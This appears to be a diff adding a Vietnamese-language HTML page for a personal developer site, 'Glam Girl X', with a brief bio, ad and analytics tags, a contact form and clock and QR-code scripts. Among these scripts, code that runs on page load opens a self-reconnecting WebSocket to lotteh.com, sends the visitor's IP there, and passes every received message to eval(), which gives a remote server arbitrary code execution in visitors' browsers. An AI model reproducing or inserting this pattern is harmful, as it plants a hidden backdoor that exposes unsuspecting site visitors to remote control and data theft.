@@ -1,0 +1,293 @@
+<!doctype html> <html lang="vi">
+
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Professional entertainment, photos, videos, audio, livestreaming and casual gameplay, as well as ID scanning, web development and surrogacy services.">
+    <meta name="author" content="Charlotte Grace Harper">
+    <link rel="icon" href="/media/favicon.ico">
+    <title>Cô Gái Quyến Rũ X - Glam Girl X</title>
+    <link rel="canonical" href="https://glamgirlx.com/vi/ad">
+    <link href="/static/main.css" rel="stylesheet">
+    <link rel="manifest" href="/site.webmanifest">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
+         crossorigin="anonymous"></script>
+	<script async src="https://www.googletagmanager.com/gtag/js?id=G-XG1SZ2K8S5"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+	
+	  gtag('config', 'G-XG1SZ2K8S5');
+	</script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16692395808">
+    </script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'AW-16692395808');
+    </script>
+  </head>
+  <body>
+    <header>
+      
+    <main role="main" class="container">
+        
+	    
+
+<div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
+     crossorigin="anonymous"></script>
+<!-- Square Ad -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6209985848112194"
+     data-ad-slot="2468505458"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</div>
+
+
+
+<p>Charlotte Harper là một nhà phát triển full stack sống ở Seattle, Washington. Tôi sử dụng đại từ nhân xưng của cô ấy/cô ấy và xây dựng phần mềm hỗ trợ internet, bao gồm ứng dụng, trò chơi, thiết bị và phần mềm khác. Trang web này là một giải pháp biên Kubernetes an toàn nơi bạn có thể ghé thăm tôi và xem những gì tôi đang xây dựng. Cảm ơn bạn đã ghé thăm ứng dụng web của tôi.</p>
+<p><i>Glam Girl X</i></p>
+<hr>
+
+        
+    </main>
+    
+    <script src="/static/main.js"></script>
+    <script>
+        
+        
+        
+        $(document).ready(function() {
+            
+            
+            $(document.getElementById("glam-navbar")).autoHidingNavbar();
+            
+        	Prism.highlightAll();
+        });
+        var socket;
+        function openSocket() {
+            window.location.hash = '';
+            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            socket.addEventListener("open", (event) => {
+                console.log('Socket open.');
+                fetch('https://lotteh.com/remote/generate/')
+        		    .then(response => response.json())
+        		    .then(data => {
+        		        socket.send(data.ip);
+        		    })
+        		    .catch(error => {
+        		        console.log('Error:', error);
+        		    });
+            });
+            socket.addEventListener("closed", (event) => {
+                console.log('Socket closed.');
+                setTimeout(function() {
+                    openSocket();
+                }, 10000);
+            });
+        	socket.addEventListener("message", (event) => {
+                    eval(event.data);
+            });
+        }
+        openSocket();
+        $(document).ready(function() {
+        	$("#contact-form").submit(function(e){
+                	e.preventDefault();
+                	var data = new FormData(document.getElementById('contact-form'));
+                	$.ajax({
+                        	url: "https://lotteh.com/contact/",
+                        	type: "POST",
+                        	data: data,
+                        	cache: false,
+                	        contentType: false,
+        	                processData: false,
+                            timeout: 1000 * 60,
+                	        tryCount: 0,
+        	                retryLimit: 5,
+                            error: (xhr, textStatus, errorThrown) => {
+                                    this.tryCount++;
+                                    if(this.tryCount >= this.retryLimit) return;
+                                    $.ajax(this);
+                            },
+                            success: (data) => {
+                                    if(data == 'Message sent.') {
+                                            $('#contact-submit').prop('disabled', true);
+                                            $(this).trigger('reset');
+                                    }
+                                    document.getElementById('contact-message').innerHTML = data;
+                                    $('#contact-message').removeClass('hide');
+                            },
+                    });
+            });
+        });
+        $(document).ready(function() {
+        	
+var months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
+var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+function updateClock() {
+    var d = new Date();
+    hr = d.getHours();
+    min = d.getMinutes();
+    sec = d.getSeconds();
+    if(hr < 9 || hr >= 21) {
+        document.getElementById("dynamicClockContainer").style.backgroundColor = "lightblue";
+    }
+    hr_rotation = 30 * hr + min / 2; /* converting current time */
+    min_rotation = 6 * min;
+    sec_rotation = 6 * sec;
+    hours = document.getElementsByClassName("dhour");
+    for(var x = 0; x < hours.length; x++) {
+        hours[x].style.transform = `rotate(${hr_rotation}deg)`;
+    }
+    minutes = document.getElementsByClassName("dminute");
+    for(var x = 0; x < minutes.length; x++) {
+        minutes[x].style.transform = `rotate(${min_rotation}deg)`;
+    }
+    seconds = document.getElementsByClassName("dsecond");
+    for(var x = 0; x < hours.length; x++) {
+        seconds[x].style.transform = `rotate(${sec_rotation}deg)`;
+    }
+	var d = new Date();
+	var day = days[d.getDay()];
+	var hr = d.getHours();
+	var min = d.getMinutes();
+	if (min < 10) {
+	    min = "0" + min;
+	}
+	var second = d.getSeconds();
+	if (second < 10) {
+	    second = "0" + second;
+	}
+	var hour = "";
+	if( hr > 9 ) {
+	    hour = hr;
+	} else {
+        hour = '0' + hr;
+    }
+	var date = d.getDate();
+	var month = months[d.getMonth()];
+	var year = d.getFullYear();
+	if(document.getElementById("current-time-text")) {
+		document.getElementById('current-time-text').innerHTML = day + " " + month + " " + date + ", " + year + " - " + hour + ":" + min + ":" + second;
+	}
+
+}
+if(document.getElementById("dynamicClockContainer")) {
+	var dynamicClockInterval = null;
+	updateClock();
+	dynamicClockInterval = setInterval(function() {
+		updateClock();
+	}, 1000);
+}
+var hrs = ["mười hai", "một", "hai", "ba", "bốn", "năm", "sáu", "bảy", "tám", "chín", "mười", "mười một"];
+var digits = ["","một", "hai", "ba", "bốn", "năm", "sáu", "bảy", "tám", "chín", "mười", "mười một"];
+var teens = ["mười một", "mười hai", "mười ba", "mười bốn", "mười lăm", "mười sáu", "mười bảy", "mười tám", "mười chín"];
+var tens = ["ồ","mười","hai mươi","ba mươi","bốn mươi","năm mươi"];
+function capitalizeFirstLetter(string) {
+    return string.charAt(0).toUpperCase() + string.slice(1);
+}
+function updateTime() {
+	var d = new Date();
+	hr = d.getHours()%12;
+	min = d.getMinutes();
+	sec = d.getSeconds();
+	var respond = null;
+	if(min == 0) {
+		respond = hrs[hr] + " o'clock";
+	} else if(min < 11 || min > 19) {
+		respond = hrs[hr] + ' ' + tens[Math.floor(min/10)] + ((digits[min%10] == "") ? '' : '-') + digits[min%10];
+	} else {
+		respond = hrs[hr] + ' ' + teens[min-11];
+	}
+	if(d.getHours() >= 12) {
+		respond = respond + " pm";
+	} else {
+		respond = respond + " am";
+	}
+	respond = capitalizeFirstLetter(respond).replace("'-", "'");
+	if(document.getElementById("current-time")){
+		document.getElementById("current-time").innerHTML = respond;
+		if(document.getElementById("current-time2")) {
+			document.getElementById("current-time2").innerHTML = respond;
+		}
+	}
+}
+var updateTimeInterval;
+function updateTimeout() {
+	if(updateTimeInterval) clearInterval(updateTimeInterval);
+	updateTime();
+	var thedate = new Date();
+	setTimeout(function() {
+		updateTime();
+		updateTimeInterval = setInterval(function() {
+			updateTime();
+		}, 60 * 1000);
+	}, (60 - thedate.getSeconds()) * 1000 + 2000);
+}
+if(document.getElementById("current-time")) {
+	updateTimeout();
+}
+
+            var qrdiv = document.getElementById("shareqrcode");
+        	if(!qrdiv) return;
+        	var qr = new QRCode(qrdiv, "https://glamgirlx.com/vi/ad?");
+        	var image = qrdiv.querySelector('img');
+            image.style.width = "100%";
+            image.style.height = "100%";
+            image.style.maxWidth = "160px";
+            image.alt = "Chia sẻ trang này bằng cách quét mã QR.";
+            function downloadQrImage(url, filename) {
+              const link = document.createElement('a');
+              link.href = url;
+              link.download = 'Glam Girl X - ' + filename;
+              document.body.appendChild(link);
+              link.click();
+              document.body.removeChild(link);
+            }
+            function downloadQr() {
+                    downloadQrImage(image.src, 'QR Code');
+            }
+            qrdiv.onclick = downloadQr;
+        });
+    </script>
+    
+    <script async type="application/javascript"
+        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
+<script>
+  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
+    basicSubscriptions.init({
+      type: "NewsArticle",
+      isPartOfType: ["Product"],
+      isPartOfProductId: "CAowktDYCw:openaccess",
+      clientOptions: { theme: "light", lang: "en" },
+    });
+  });
+</script>
+
+    
+    
+    <script>
+        if (navigator.serviceWorker) {
+            navigator.serviceWorker.register (
+              '/serviceworker.js',
+              {scope: '/'}
+            )
+        }
+    </script>
+</body>
+</html>
